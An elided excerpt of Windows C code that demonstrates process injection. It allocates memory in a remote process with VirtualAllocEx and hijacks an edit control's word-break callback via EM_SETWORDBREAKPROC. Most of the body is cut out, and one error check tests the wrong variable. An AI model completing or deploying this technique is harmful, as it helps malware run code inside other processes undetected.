...
/*
https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nc-winuser-editwordbreakproca
...
int ToBeInjected(LPSTR lpch,	int ichCurrent,	int cch, int code)
{
...
void inject_EditWordBreakProc(LPINJECTINFO ii, HWND hwnd)
{
	DWORD dwProcessID = 0;
	...
	if (dwProcessID == ii->pid) //if it matches the pid where we want to inject
	{
		...
		SendMessage(hwnd, EM_SETWORDBREAKPROC, 0, (LPARAM)ii->address); //injection!!!
	}
}
...
static BOOL CALLBACK enumChildWindowCallback(HWND hwnd, LPARAM lparam)
{
	...
	inject_EditWordBreakProc((LPINJECTINFO)lparam, hwnd);
...
int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	...
	LPVOID DataAddress = VirtualAllocEx(hProcess,(LPVOID)0x0000440000000000, sizeof	(PARAMETERS), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
